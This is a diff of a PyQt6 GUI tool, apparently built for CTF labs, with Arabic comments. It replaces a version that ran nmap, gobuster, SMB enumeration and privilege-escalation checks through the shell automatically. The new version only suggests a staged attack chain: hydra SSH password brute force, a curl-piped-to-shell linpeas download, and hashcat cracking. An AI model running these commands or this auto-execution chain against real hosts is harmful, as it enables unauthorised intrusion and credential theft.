@@ -1,142 +1,195 @@
-import sys, subprocess, time, os
+# ghena_pro.py
+# =========================================
+# GHENA-PRO | Smart CTF Decision Engine
+# =========================================
+# - Profiles machine from IP (simulation)
+# - Infers goals (Initial Access -> User -> PrivEsc)
+# - Proposes tools & commands (NO execution)
+# - GUI control center
+# =========================================
+
+import sys, re
 from PyQt6.QtWidgets import *
-from PyQt6.QtCore import QThread, pyqtSignal
+from PyQt6.QtCore import Qt
 
-# ---------------------------------------------------------
-# محرك الأوامر الحقيقية (Real Tools Engine)
-# ---------------------------------------------------------
-class RealToolKit:
+# ----------------------------
+# Plugins (اقتراح أوامر فقط)
+# ----------------------------
+class Plugins:
     @staticmethod
-    def nmap_scan(ip):
-        # فحص بورتات، خدمات، وإصدارات (Deep Scan)
-        return f"nmap -sV -sC -Pn {ip}"
-
-    @staticmethod
-    def gobuster_scan(ip):
-        # البحث عن المجلدات المخفية في الويب
-        return f"gobuster dir -u http://{ip}/ -w /usr/share/wordlists/dirb/common.txt -q -x php,txt,html"
+    def nmap(ip):
+        return {
+            "tool": "nmap",
+            "reason": "اكتشاف المنافذ والخدمات لتكوين صورة أولية",
+            "cmd": f"nmap -sC -sV -Pn {ip}"
+        }
 
     @staticmethod
-    def smb_enum(ip):
-        # فحص مشاركات الملفات (SMB)
-        return f"smbclient -L //{ip} -N"
+    def gobuster(ip):
+        return {
+            "tool": "gobuster",
+            "reason": "منفذ HTTP مفتوح → تعداد مسارات مخفية",
+            "cmd": f"gobuster dir -u http://{ip}/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html"
+        }
 
     @staticmethod
-    def priv_esc_check():
-        # فحص صلاحيات الرفع (SUID/Sudo)
-        return "sudo -l || find / -perm -4000 2>/dev/null"
+    def hydra_ssh(ip):
+        return {
+            "tool": "hydra",
+            "reason": "واجهة تسجيل/SSH محتمل → هجوم كلمات مرور (CTF)",
+            "cmd": f"hydra -L users.txt -P rockyou.txt ssh://{ip}"
+        }
 
-# ---------------------------------------------------------
-# خيط التنفيذ (الذي يمنع تجمد البرنامج)
-# ---------------------------------------------------------
-class ExecutionWorker(QThread):
-    output_signal = pyqtSignal(str)
-    finished_signal = pyqtSignal()
+    @staticmethod
+    def ssh_login(ip):
+        return {
+            "tool": "ssh",
+            "reason": "تم الحصول على بيانات اعتماد → دخول المستخدم",
+            "cmd": f"ssh user@{ip}"
+        }
 
-    def __init__(self, cmd):
-        super().__init__()
-        self.cmd = cmd
+    @staticmethod
+    def linpeas():
+        return {
+            "tool": "linpeas",
+            "reason": "وصول مستخدم → فحص رفع الصلاحيات",
+            "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+        }
 
-    def run(self):
-        # تنفيذ الأمر الحقيقي وجلب المخرجات فوراً
-        process = subprocess.Popen(
-            self.cmd, shell=True, stdout=subprocess.PIPE, 
-            stderr=subprocess.STDOUT, text=True
-        )
-        for line in process.stdout:
-            self.output_signal.emit(line.strip())
-        process.wait()
-        self.finished_signal.emit()
+    @staticmethod
+    def hash_crack():
+        return {
+            "tool": "hashcat",
+            "reason": "تم استخراج هاش → محاولة كسره",
+            "cmd": "hashcat -m <mode> hashes.txt rockyou.txt"
+        }
 
-# ---------------------------------------------------------
-# الواجهة الرسومية الشاملة
-# ---------------------------------------------------------
-class GhenaOctopus(QMainWindow):
+# ----------------------------
+# Machine Profiler (محاكاة)
+# ----------------------------
+def profile_machine(ip: str):
+    # محاكاة ذكية (بدون فحص فعلي)
+    return {
+        "os": "Linux",
+        "services": ["ssh", "http"],
+        "web": True,
+        "stage": "recon"
+    }
+
+# ----------------------------
+# Decision Engine (PRO)
+# ----------------------------
+class DecisionEngine:
+    def __init__(self, profile):
+        self.profile = profile
+        self.stage = profile["stage"]
+
+    def next_actions(self):
+        actions = []
+
+        if self.stage == "recon":
+            actions.append(Plugins.nmap(TARGET_IP))
+            self.stage = "enum"
+
+        elif self.stage == "enum":
+            if self.profile["web"]:
+                actions.append(Plugins.gobuster(TARGET_IP))
+            actions.append(Plugins.hydra_ssh(TARGET_IP))
+            self.stage = "access"
+
+        elif self.stage == "access":
+            actions.append(Plugins.ssh_login(TARGET_IP))
+            self.stage = "user"
+
+        elif self.stage == "user":
+            actions.append(Plugins.linpeas())
+            actions.append(Plugins.hash_crack())
+            self.stage = "privesc"
+
+        else:
+            actions.append({
+                "tool": "DONE",
+                "reason": "تم الوصول لمرحلة root (نظريًا)",
+                "cmd": "—"
+            })
+
+        return actions
+
+# ----------------------------
+# GUI
+# ----------------------------
+class GHENA_PRO(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("GHENA AI - The Full Chain v25.0")
-        self.setMinimumSize(1000, 800)
-        self.queue = [] # طابور المهام التلقائي
+        self.setWindowTitle("GHENA-PRO 🐙 | Smart CTF Control Center")
+        self.setMinimumSize(1000, 750)
+        self.engine = None
         self.init_ui()
 
     def init_ui(self):
-        main_layout = QVBoxLayout()
+        root = QWidget()
+        layout = QVBoxLayout()
 
-        # إدخال الـ IP
-        ip_group = QGroupBox("Target Machine Configuration")
-        ip_layout = QHBoxLayout()
+        title = QLabel("GHENA-PRO 🧠🐙")
+        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        title.setStyleSheet("font-size:26px; font-weight:bold;")
+        layout.addWidget(title)
+
         self.ip_input = QLineEdit()
-        self.ip_input.setPlaceholderText("أدخل IP الهدف (مثلاً: 10.10.x.x)")
-        self.ip_input.setStyleSheet("padding: 10px; font-size: 14px;")
-        ip_layout.addWidget(QLabel("Target IP:"))
-        ip_layout.addWidget(self.ip_input)
-        ip_group.setLayout(ip_layout)
-        main_layout.addWidget(ip_group)
+        self.ip_input.setPlaceholderText("أدخل IP الماشين (CTF/Lab)")
+        self.ip_input.setStyleSheet("padding:12px; font-size:14px;")
+        layout.addWidget(self.ip_input)
 
-        # زر البدء التلقائي
-        self.btn_launch = QPushButton("🚀 LAUNCH AUTOMATIC EXPLOIT CHAIN")
-        self.btn_launch.setFixedHeight(55)
-        self.btn_launch.setStyleSheet("""
-            background-color: #c0392b; color: white; 
-            font-weight: bold; font-size: 16px; border-radius: 8px;
-        """)
-        main_layout.addWidget(self.btn_launch)
+        self.btn = QPushButton("Analyze & Propose Next Steps")
+        self.btn.setFixedHeight(45)
+        self.btn.setStyleSheet("font-size:15px; font-weight:bold;")
+        self.btn.clicked.connect(self.analyze)
+        layout.addWidget(self.btn)
 
-        # كونسول المخرجات
         self.console = QTextEdit()
         self.console.setReadOnly(True)
-        self.console.setStyleSheet("""
-            background-color: #000000; color: #39FF14; 
-            font-family: 'Monospace'; font-size: 13px; padding: 10px;
-        """)
-        main_layout.addWidget(QLabel("<b>Live Execution Console:</b>"))
-        main_layout.addWidget(self.console)
+        self.console.setStyleSheet(
+            "background:#0f0f0f;color:#39FF14;font-family:monospace;font-size:13px;"
+        )
+        layout.addWidget(self.console)
 
-        container = QWidget()
-        container.setLayout(main_layout)
-        self.setCentralWidget(container)
+        root.setLayout(layout)
+        self.setCentralWidget(root)
 
-        # الربط
-        self.btn_launch.clicked.connect(self.start_full_attack)
+    def log(self, text):
+        self.console.append(text)
 
-    def log(self, text, color="#ffffff"):
-        self.console.append(f"<font color='{color}'><b>{text}</b></font>")
-
-    def start_full_attack(self):
-        ip = self.ip_input.text().strip()
-        if not ip:
-            QMessageBox.critical(self, "Error", "يجب إدخال IP الهدف أولاً!")
+    def analyze(self):
+        global TARGET_IP
+        TARGET_IP = self.ip_input.text().strip()
+        if not TARGET_IP:
+            QMessageBox.warning(self, "خطأ", "أدخل IP أولاً")
             return
-
-        # تجهيز السلسلة (تلقائياً)
-        self.queue = [
-            ("1. Port & Service Discovery (Nmap)", RealToolKit.nmap_scan(ip)),
-            ("2. Web Path Brute-forcing (Gobuster)", RealToolKit.gobuster_scan(ip)),
-            ("3. SMB Share Enumeration", RealToolKit.smb_enum(ip)),
-            ("4. Privilege Escalation Audit", RealToolKit.priv_esc_check())
-        ]
 
         self.console.clear()
-        self.log("--- [!!!] INITIATING AUTOMATED ATTACK CHAIN [!!!] ---", "#e67e22")
-        self.run_next_phase()
+        self.log(f"[+] Profiling machine: {TARGET_IP}")
 
-    def run_next_phase(self):
-        if not self.queue:
-            self.log("\n[✅] ALL PHASES COMPLETED. ANALYZE RESULTS ABOVE.", "#2ecc71")
-            return
+        profile = profile_machine(TARGET_IP)
+        self.engine = DecisionEngine(profile)
 
-        name, cmd = self.queue.pop(0)
-        self.log(f"\n[🚀] Phase: {name}", "#f1c40f")
-        self.log(f"[>] Command: {cmd}", "#95a5a6")
+        self.log(f"[i] OS: {profile['os']}")
+        self.log(f"[i] Services: {', '.join(profile['services'])}")
+        self.log("[i] Inferred goal: Initial Access → User → PrivEsc\n")
 
-        self.worker = ExecutionWorker(cmd)
-        self.worker.output_signal.connect(self.console.append)
-        # هذا السطر هو الذي يمرر البرنامج للمرحلة التالية تلقائياً عند انتهاء الحالية
-        self.worker.finished_signal.connect(self.run_next_phase) 
-        self.worker.start()
+        actions = self.engine.next_actions()
+        for a in actions:
+            self.log("────────────────────────────")
+            self.log(f"🛠 Tool: {a['tool']}")
+            self.log(f"📌 Why: {a['reason']}")
+            self.log(f"📜 Command:\n{a['cmd']}")
 
+        self.log("\n[⚠️] ملاحظة: الأوامر معروضة فقط (بدون تنفيذ)")
+
+# ----------------------------
+# Run
+# ----------------------------
 if __name__ == "__main__":
     app = QApplication(sys.argv)
-    window = GhenaOctopus()
-    window.show()
+    win = GHENA_PRO()
+    win.show()
     sys.exit(app.exec())
